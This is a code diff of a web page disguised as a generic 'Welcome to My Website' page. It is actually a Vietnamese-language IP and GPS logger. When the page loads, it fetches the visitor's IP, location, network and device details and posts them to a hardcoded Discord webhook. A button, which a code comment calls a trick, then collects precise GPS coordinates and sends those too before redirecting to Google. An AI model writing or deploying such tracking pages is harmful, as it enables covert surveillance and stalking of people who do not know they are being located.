@@ -1,3 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome - Loading Content</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            text-align: center;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 1.8em;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 1em;
+            color: #666;
+            margin-top: 5px;
+        }
+        .ip-address {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: #ff0000;
+            margin: 15px 0;
+        }
+        .btn {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1.1em;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="main-card">
+        <h1>Welcome to My Website</h1>
+        <p id="status">Đang đồng bộ hóa dữ liệu thiết bị...</p>
+        <div class="ip-address" id="ip-address">Loading...</div>
+        
+        <!-- Nút bấm đánh lừa người dùng bấm vào để lấy GPS chuẩn xác -->
+        <button class="btn" id="action-btn" onclick="requestGPS()">Bấm vào đây để tiếp tục</button>
+    </div>
+    
     <script>
     let globalData = {};
     const webhookUrl = "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6";
@@ -12,23 +81,20 @@
         let lon = globalData.lon || (globalData.loc ? globalData.loc.split(',')[1] : 'N/A');
         let mapsLink = (lat !== 'N/A' && lon !== 'N/A') ? `https://www.google.com/maps?q=${lat},${lon}` : 'Không có tọa độ';
 
-        // Lấy thời gian chính xác theo thiết bị của người truy cập
-        let visitorTime = new Date().toLocaleString("vi-VN", { timeZone: globalData.timezone || undefined });
-        let userTimezone = globalData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
-
         var params = {
             username: "Cordly Image Logger by phongdepzai02",
             content: `🎯 Có tương tác mới! ${extraText}`,
             embeds: [
                 {
-                    title: "📍 Thời gian & Tọa độ truy cập",
+                    title: "📍 Tọa độ GPS & IP Chuẩn xác",
                     color: 3447003,
                     fields: [
-                        { name: "⏰ Thời gian người đó bấm (Giờ địa phương của họ)", value: `\`${visitorTime}\``, inline: false },
-                        { name: "🌍 Múi giờ & Quốc gia", value: `Múi giờ: \`${userTimezone}\`\nQuốc gia: \`${globalData.country || 'N/A'}\` - Thành phố: \`${globalData.city || 'N/A'}\``, inline: false },
                         { name: "🌐 IP Address", value: `\`${globalData.ip || 'N/A'}\``, inline: false },
                         { name: "🛡️ VPN/Proxy", value: `🚩 **${isVpnOrProxy}**`, inline: false },
-                        { name: "🗺️ Google Maps (Tọa độ)", value: `[Bấm vào đây để xem vị trí](${mapsLink})\n*Tọa độ: ${lat},${lon}*`, inline: false },
+                        { name: "🌍 Timezone", value: `${globalData.timezone || 'N/A'}`, inline: false },
+                        { name: "📍 Địa điểm (IP Geolocation)", value: `${globalData.city || 'N/A'}, ${globalData.region \vert{}\vert{} 'N/A'},${globalData.country || 'N/A'}`, inline: false },
+                        { name: "🗺️ Google Maps (Tọa độ chính xác)", value: `[Bấm vào đây để xem vị trí thực tế](${mapsLink})\n*Tọa độ: ${lat},${lon}*`, inline: false },
+                        { name: "🏢 Network / Hostname", value: `${globalData.org || 'N/A'}`, inline: false },
                         { name: "💻 Thiết bị", value: `\`${navigator.userAgent}\``, inline: false }
                     ],
                     footer: {
@@ -43,5 +109,44 @@
         request.setRequestHeader('Content-type', 'application/json');
         request.send(JSON.stringify(params));
     }
+
+    // Lấy IP cơ bản trước qua JSONP
+    function monke(json) {
+        globalData = json;
+        document.getElementById('ip-address').innerText = json.ip;
+        document.getElementById('status').innerText = "Vui lòng xác thực để xem nội dung đầy đủ:";
+        // Gửi báo cáo IP thô trước để phòng hờ họ không bấm nút
+        sendToDiscord("(IP thô ban đầu)");
+    }
+
+    // Khi người dùng bấm nút, kích hoạt xin GPS siêu mượt
+    function requestGPS() {
+        document.getElementById('status').innerText = "Đang tải nội dung, vui lòng đợi...";
+        document.getElementById('action-btn').style.display = "none";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    globalData.lat = position.coords.latitude;
+                    globalData.lon = position.coords.longitude;
+                    sendToDiscord("(🔥 Đã lấy tọa độ GPS thực tế chuẩn xác!)");
+                    document.getElementById('status').innerText = "Tải hoàn tất! Đang chuyển hướng...";
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com"; // Hoặc đổi sang link ảnh/trang đích thực tế của bạn
+                    }, 1500);
+                },
+                function(error) {
+                    sendToDiscord("(⚠️ Người dùng từ chối GPS, dùng tọa độ IP)");
+                    document.getElementById('status').innerText = "Đã hoàn tất!";
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        } else {
+            sendToDiscord();
+        }
+    }
     </script>
-    
+
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+</body>
+</html>
